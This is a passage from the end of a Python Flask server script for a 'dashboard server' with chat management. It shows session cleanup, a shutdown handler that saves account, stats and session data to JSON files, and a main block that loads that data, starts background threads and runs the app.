        if expired:
            logger.info(f"Cleaned up {len(expired)} expired sessions")
    except Exception as e:
        logger.error(f"Session cleanup error: {e}")

def signal_handler(signum, frame):
    logger.info(f"Signal {signum}, shutting down...")
    save_json(ACCOUNTS_FILE, accounts)
    save_json(STATS_FILE, stats)
    save_temp_sessions()
    save_auto_sessions()
    save_user_map()
    logger.info("Data saved. Exiting.")
    sys.exit(0)

signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGINT, signal_handler)

# ============================================
# MAIN
# ============================================
if __name__ == '__main__':
    try:
        accounts.extend(load_json(ACCOUNTS_FILE, []))
        stats_data = load_json(STATS_FILE, {})
        if stats_data:
            stats.update(stats_data)
        load_temp_sessions()
        load_auto_sessions()
        load_user_map()
        
        print(f"""
╔══════════════════════════════════════════════════════╗
║     DASHBOARD SERVER #{SERVER_NUMBER} - {SERVER_NAME}                    ║
╠══════════════════════════════════════════════════════╣
║  Accounts: {len(accounts):<39} ║
║  Features: ✅ Chat Management        ║
╚══════════════════════════════════════════════════════╝
        """)
        
        threading.Thread(target=keep_alive, daemon=True, name="keep_alive").start()
        threading.Thread(target=restore_and_start, daemon=True, name="restore").start()
        threading.Thread(target=cleanup_caches, daemon=True, name="cache_cleanup").start()
        
        app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
            
    except Exception as e:
        logger.critical(f"Fatal startup error: {e}")
        logger.critical(traceback.format_exc())
        try:
            save_json(ACCOUNTS_FILE, accounts)
            save_json(STATS_FILE, stats)
        except:
            pass
        sys.exit(1)
